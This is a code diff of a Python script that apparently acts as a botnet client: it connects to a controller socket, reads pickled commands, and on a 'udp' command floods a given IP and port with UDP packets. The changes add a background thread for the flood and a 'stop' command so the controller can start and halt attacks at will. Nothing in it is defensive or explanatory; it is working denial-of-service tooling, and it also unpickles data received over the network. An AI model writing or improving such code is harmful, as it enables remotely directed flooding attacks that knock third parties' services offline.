@@ -1,5 +1,8 @@
 import socket
 import pickle
+import threading
+
+attack = False
 
 # creates and connects a socket
 def create():
@@ -14,12 +17,14 @@ def create():
             print("connection failed!")
 
 def udp_flood(ip, port, message):
+    #global attack
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-    while True:
+    while attack == True:
         sock.sendto(message.encode("utf-8"), (ip, port))
 
 def yes():
+    global attack
     sock = create()
 
     while True:
@@ -30,9 +35,13 @@ def yes():
                 print(command)
 
                 if command[0] == "msg":
-                    print(command[0])
+                    print(command[1])
                 elif command[0] == "udp":
-                    udp_flood(command[1], command[2], command[3])
+                    attack = True
+                    threading.Thread(target=udp_flood, args=(command[1], command[2], command[3])).start()
+                elif command[0] == "stop":
+                    attack = False
+                    print("stoped")
             except:
                 pass
         except:
